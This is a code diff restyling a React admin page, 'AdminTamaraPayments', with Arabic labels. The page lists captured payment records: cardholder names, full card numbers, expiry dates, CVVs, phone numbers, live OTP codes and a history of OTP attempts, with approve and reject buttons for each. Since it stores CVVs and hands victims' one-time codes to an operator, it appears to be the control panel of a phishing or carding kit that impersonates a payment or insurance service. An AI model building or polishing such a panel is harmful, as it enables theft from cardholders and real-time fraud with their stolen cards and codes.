@@ -290,122 +290,116 @@ const AdminTamaraPayments = () => {
                 </Card>
               ) : (
                 payments.map((payment) => (
-                  <Card key={payment.id} className="overflow-hidden border-2 hover:shadow-xl transition-shadow">
-                    <CardHeader className="bg-gradient-to-r from-primary/5 to-primary/10 border-b-2">
-                      <div className="flex items-center justify-between mb-2">
-                        <div className="flex items-center gap-3">
-                          <div className="p-2 bg-white rounded-lg shadow-sm">
-                            <CreditCard className="h-6 w-6 text-primary" />
-                          </div>
-                          <div>
-                            <CardTitle className="text-xl">{payment.cardholder_name}</CardTitle>
-                            <CardDescription className="text-sm mt-1">
-                              {format(new Date(payment.created_at), 'PPp', { locale: ar })}
-                            </CardDescription>
-                          </div>
+                  <Card key={payment.id} className="overflow-hidden">
+                    <CardHeader className="bg-muted/50 border-b">
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-2">
+                          <CreditCard className="h-5 w-5 text-primary" />
+                          <CardTitle className="text-lg">{payment.cardholder_name}</CardTitle>
                         </div>
                         {getStatusBadge(payment.payment_status)}
                       </div>
+                      <CardDescription className="mt-1">
+                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
+                      </CardDescription>
                     </CardHeader>
 
                     <CardContent className="p-6">
-                      {/* معلومات الدفع الأساسية */}
-                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
-                        <div className="bg-blue-50 rounded-lg p-4 border border-blue-200">
-                          <p className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</p>
-                          <p className="font-bold text-gray-900">{payment.company}</p>
-                        </div>
-                        <div className="bg-green-50 rounded-lg p-4 border border-green-200">
-                          <p className="text-xs text-green-600 font-medium mb-1">المبلغ الشهري</p>
-                          <p className="font-bold text-xl text-green-700">{payment.monthly_payment} ر.س</p>
-                        </div>
-                        <div className="bg-purple-50 rounded-lg p-4 border border-purple-200">
-                          <p className="text-xs text-purple-600 font-medium mb-1">المبلغ الإجمالي</p>
-                          <p className="font-bold text-xl text-purple-700">{payment.total_amount} ر.س</p>
-                        </div>
-                      </div>
-
-                      {/* رقم الهاتف */}
-                      {payment.phone && (
-                        <div className="bg-gray-50 rounded-lg p-3 mb-6 border border-gray-200">
-                          <div className="flex items-center gap-2">
-                            <span className="text-xs text-gray-600 font-medium">رقم الهاتف:</span>
-                            <span className="font-bold text-gray-900 text-lg">{payment.phone}</span>
+                      {/* معلومات أساسية */}
+                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
+                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                          <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
+                          <div className="font-bold text-sm text-gray-900 truncate" title={payment.company}>
+                            {payment.company}
                           </div>
                         </div>
-                      )}
-
-                      {/* كود التحقق الحالي */}
-                      <div className="mb-6">
-                        <div className="bg-gradient-to-r from-primary to-primary/80 rounded-xl p-4 shadow-lg">
-                          <p className="text-white text-xs font-medium mb-2 text-center">كود التحقق الحالي (OTP)</p>
-                          <div className="bg-white rounded-lg p-4">
-                            <p className="font-bold text-3xl text-primary text-center tracking-widest">
-                              {payment.otp_code || 'لم يتم إدخاله بعد'}
-                            </p>
+                        
+                        {payment.phone && (
+                          <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
+                            <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
+                            <div className="font-bold text-sm text-gray-900" dir="ltr">
+                              {payment.phone}
+                            </div>
+                          </div>
+                        )}
+                        
+                        <div className="bg-green-50 border border-green-200 rounded-lg p-3">
+                          <div className="text-xs text-green-600 font-medium mb-1">المبلغ الشهري</div>
+                          <div className="font-bold text-lg text-green-700">
+                            {payment.monthly_payment} ر.س
                           </div>
                         </div>
+                        
+                        <div className="bg-orange-50 border border-orange-200 rounded-lg p-3">
+                          <div className="text-xs text-orange-600 font-medium mb-1">المبلغ الإجمالي</div>
+                          <div className="font-bold text-lg text-orange-700">
+                            {payment.total_amount} ر.س
+                          </div>
+                        </div>
+                        
+                        {payment.otp_code && (
+                          <div className="bg-primary/10 border-2 border-primary rounded-lg p-3 md:col-span-2">
+                            <div className="text-xs text-primary font-medium mb-1">كود التحقق الحالي</div>
+                            <div className="font-bold text-2xl text-primary text-center tracking-widest">
+                              {payment.otp_code}
+                            </div>
+                          </div>
+                        )}
                       </div>
 
-                      {/* محاولات الدفع المتعددة */}
+                      {/* محاولات الدفع */}
                       {payment.payment_attempts && payment.payment_attempts.length > 0 && (
-                        <div className="mb-6">
-                          <div className="flex items-center gap-2 mb-4">
-                            <div className="h-1 flex-1 bg-gradient-to-r from-primary to-transparent rounded"></div>
-                            <p className="font-bold text-lg text-gray-800">محاولات الدفع</p>
-                            <span className="bg-primary text-white text-xs font-bold px-3 py-1 rounded-full">
-                              {payment.payment_attempts.length}
-                            </span>
-                            <div className="h-1 flex-1 bg-gradient-to-l from-primary to-transparent rounded"></div>
-                          </div>
-                          
-                          <div className="space-y-3">
+                        <div className="mb-6 space-y-2">
+                          <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600">
+                            <CreditCard className="h-4 w-4" />
+                            محاولات الدفع ({payment.payment_attempts.length})
+                          </h3>
+                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                             {payment.payment_attempts.map((attempt, index) => (
-                              <div key={attempt.id} className="bg-gradient-to-r from-gray-50 to-white rounded-xl p-5 border-2 border-gray-200 shadow-sm hover:shadow-md transition-shadow">
-                                <div className="flex items-center justify-between mb-4">
-                                  <div className="flex items-center gap-2">
-                                    <div className="bg-primary text-white rounded-full w-8 h-8 flex items-center justify-center font-bold text-sm">
-                                      {index + 1}
-                                    </div>
-                                    <span className="font-bold text-gray-700">المحاولة {index + 1}</span>
-                                  </div>
+                              <div key={attempt.id} className="bg-orange-50 border border-orange-200 rounded-lg p-3">
+                                <div className="flex justify-between items-center mb-2">
+                                  <span className="text-xs font-semibold text-orange-600">
+                                    محاولة #{payment.payment_attempts!.length - index}
+                                  </span>
                                   <span className="text-xs text-gray-500">
-                                    {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
+                                    {format(new Date(attempt.created_at), 'HH:mm', { locale: ar })}
                                   </span>
                                 </div>
-
-                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
-                                  <div className="bg-white rounded-lg p-3 border border-gray-200">
-                                    <p className="text-xs text-gray-500 mb-1">حامل البطاقة</p>
-                                    <p className="font-bold text-gray-900">{attempt.card_holder_name}</p>
+                                <div className="space-y-1.5 text-xs">
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-500">رقم البطاقة:</span>
+                                    <span className="font-mono font-medium" dir="ltr">
+                                      {attempt.card_number}
+                                    </span>
                                   </div>
-                                  <div className="bg-white rounded-lg p-3 border border-gray-200">
-                                    <p className="text-xs text-gray-500 mb-1">رقم البطاقة</p>
-                                    <p className="font-mono font-bold text-gray-900">{attempt.card_number}</p>
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-500">الاسم:</span>
+                                    <span className="font-medium truncate max-w-[120px]" title={attempt.card_holder_name}>
+                                      {attempt.card_holder_name}
+                                    </span>
                                   </div>
-                                  <div className="bg-white rounded-lg p-3 border border-gray-200">
-                                    <p className="text-xs text-gray-500 mb-1">تاريخ الانتهاء</p>
-                                    <p className="font-mono font-bold text-gray-900">{attempt.expiry_date}</p>
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-500">الانتهاء:</span>
+                                    <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
                                   </div>
-                                  <div className="bg-white rounded-lg p-3 border border-gray-200">
-                                    <p className="text-xs text-gray-500 mb-1">CVV</p>
-                                    <p className="font-mono font-bold text-gray-900">{attempt.cvv}</p>
+                                  <div className="flex justify-between">
+                                    <span className="text-gray-500">CVV:</span>
+                                    <span className="font-mono font-medium">{attempt.cvv}</span>
                                   </div>
                                 </div>
-                                
+
                                 {/* أزرار الموافقة والرفض لكل بطاقة */}
-                                {payment.payment_status === 'pending' && (
-                                  <div className="flex gap-3 pt-3 border-t-2 border-gray-200">
+                                {payment.payment_status === 'pending' && index === 0 && (
+                                  <div className="flex gap-2 mt-3 pt-3 border-t border-orange-300">
                                     <Button
                                       onClick={() => handleApprove(payment.id)}
                                       disabled={processingPayment === payment.id}
-                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white shadow-md"
-                                      size="sm"
+                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                     >
                                       {processingPayment === payment.id ? (
-                                        <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                       ) : (
-                                        <Check className="h-4 w-4 ml-2" />
+                                        <Check className="h-3 w-3 ml-1" />
                                       )}
                                       موافقة
                                     </Button>
@@ -413,13 +407,12 @@ const AdminTamaraPayments = () => {
                                       onClick={() => handleReject(payment.id)}
                                       disabled={processingPayment === payment.id}
                                       variant="destructive"
-                                      className="flex-1 shadow-md"
-                                      size="sm"
+                                      className="flex-1 h-8 text-xs"
                                     >
                                       {processingPayment === payment.id ? (
-                                        <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                       ) : (
-                                        <X className="h-4 w-4 ml-2" />
+                                        <X className="h-3 w-3 ml-1" />
                                       )}
                                       رفض
                                     </Button>
@@ -431,54 +424,47 @@ const AdminTamaraPayments = () => {
                         </div>
                       )}
 
-                      {/* محاولات OTP المتعددة */}
+                      {/* محاولات OTP */}
                       {payment.otp_attempts && payment.otp_attempts.length > 0 && (
-                        <div>
-                          <div className="flex items-center gap-2 mb-4">
-                            <div className="h-1 flex-1 bg-gradient-to-r from-blue-500 to-transparent rounded"></div>
-                            <p className="font-bold text-lg text-gray-800">سجل أكواد التحقق</p>
-                            <span className="bg-blue-500 text-white text-xs font-bold px-3 py-1 rounded-full">
-                              {payment.otp_attempts.length}
-                            </span>
-                            <div className="h-1 flex-1 bg-gradient-to-l from-blue-500 to-transparent rounded"></div>
-                          </div>
-                          
-                          <div className="space-y-3">
+                        <div className="space-y-2">
+                          <h3 className="font-semibold flex items-center gap-2 text-sm text-blue-600">
+                            <Check className="h-4 w-4" />
+                            محاولات OTP ({payment.otp_attempts.length})
+                          </h3>
+                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
                             {payment.otp_attempts.map((attempt, index) => {
                               const isLatest = index === 0;
                               return (
                                 <div 
                                   key={attempt.id} 
-                                  className={`rounded-xl p-4 border-2 transition-all shadow-sm hover:shadow-md ${
+                                  className={`border rounded-lg p-3 ${
                                     isLatest 
-                                      ? 'bg-gradient-to-r from-green-50 to-green-100 border-green-400' 
-                                      : 'bg-gradient-to-r from-gray-50 to-gray-100 border-gray-300'
+                                      ? 'bg-blue-50 border-blue-300 ring-2 ring-blue-200' 
+                                      : 'bg-gray-50 border-gray-200'
                                   }`}
                                 >
-                                  <div className="flex items-center justify-between">
-                                    <div className="flex-1">
-                                      <div className="flex items-center gap-2 mb-2">
-                                        {isLatest && (
-                                          <span className="bg-green-600 text-white text-xs font-bold px-3 py-1 rounded-full">
-                                            🔥 جديد
-                                          </span>
-                                        )}
-                                        <p className={`font-bold text-sm ${isLatest ? 'text-green-700' : 'text-gray-600'}`}>
-                                          {isLatest ? 'الكود الحالي' : `الكود القديم #${payment.otp_attempts.length - index}`}
-                                        </p>
-                                      </div>
-                                      <p className="text-gray-600 text-xs">
-                                        {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
-                                      </p>
-                                    </div>
-                                    <div className={`text-left px-4 py-2 rounded-lg ${
-                                      isLatest ? 'bg-white border-2 border-green-400' : 'bg-white border border-gray-300'
-                                    }`}>
-                                      <p className={`font-bold text-3xl tracking-wider ${
-                                        isLatest ? 'text-green-600' : 'text-gray-500'
+                                  <div className="flex justify-between items-center mb-2">
+                                    <span className={`text-xs font-semibold ${isLatest ? 'text-blue-600' : 'text-gray-500'}`}>
+                                      {isLatest ? '🔥 الأحدث' : `محاولة #${payment.otp_attempts!.length - index}`}
+                                    </span>
+                                    <span className="text-xs text-gray-500">
+                                      {new Date(attempt.created_at).toLocaleTimeString('ar-SA', {
+                                        hour: '2-digit',
+                                        minute: '2-digit',
+                                      })}
+                                    </span>
+                                  </div>
+                                  <div className="space-y-1.5 text-xs">
+                                    <div className="flex justify-between items-center">
+                                      <span className="text-gray-500">الكود:</span>
+                                      <span className={`font-mono font-bold text-lg ${
+                                        isLatest ? 'text-blue-600' : 'text-gray-600'
                                       }`}>
                                         {attempt.otp_code}
-                                      </p>
+                                      </span>
+                                    </div>
+                                    <div className="text-xs text-gray-500 text-center">
+                                      {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                     </div>
                                   </div>
                                 </div>
@@ -490,35 +476,32 @@ const AdminTamaraPayments = () => {
 
                       {/* أزرار الموافقة/الرفض على OTP */}
                       {payment.otp_code && payment.payment_status !== 'completed' && payment.payment_status !== 'otp_rejected' && (
-                        <div className="mt-6 pt-6 border-t-2 border-gray-200">
-                          <p className="font-semibold text-sm mb-3 text-gray-600">إجراءات كود التحقق</p>
-                          <div className="flex gap-3">
-                            <Button
-                              onClick={() => handleApproveOtp(payment.id)}
-                              disabled={processingPayment === payment.id}
-                              className="flex-1 bg-green-600 hover:bg-green-700 text-white shadow-md"
-                            >
-                              {processingPayment === payment.id ? (
-                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
-                              ) : (
-                                <Check className="h-4 w-4 ml-2" />
-                              )}
-                              الموافقة على OTP
-                            </Button>
-                            <Button
-                              onClick={() => handleRejectOtp(payment.id)}
-                              disabled={processingPayment === payment.id}
-                              variant="destructive"
-                              className="flex-1 shadow-md"
-                            >
-                              {processingPayment === payment.id ? (
-                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
-                              ) : (
-                                <X className="h-4 w-4 ml-2" />
-                              )}
-                              رفض OTP
-                            </Button>
-                          </div>
+                        <div className="flex gap-3 mt-6 pt-4 border-t border-border">
+                          <Button
+                            onClick={() => handleApproveOtp(payment.id)}
+                            disabled={processingPayment === payment.id}
+                            className="flex-1 bg-green-600 hover:bg-green-700 h-10"
+                          >
+                            {processingPayment === payment.id ? (
+                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                            ) : (
+                              <Check className="h-4 w-4 ml-2" />
+                            )}
+                            موافقة - OTP
+                          </Button>
+                          <Button
+                            onClick={() => handleRejectOtp(payment.id)}
+                            disabled={processingPayment === payment.id}
+                            variant="destructive"
+                            className="flex-1 h-10"
+                          >
+                            {processingPayment === payment.id ? (
+                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                            ) : (
+                              <X className="h-4 w-4 ml-2" />
+                            )}
+                            رفض - OTP
+                          </Button>
                         </div>
                       )}
                     </CardContent>
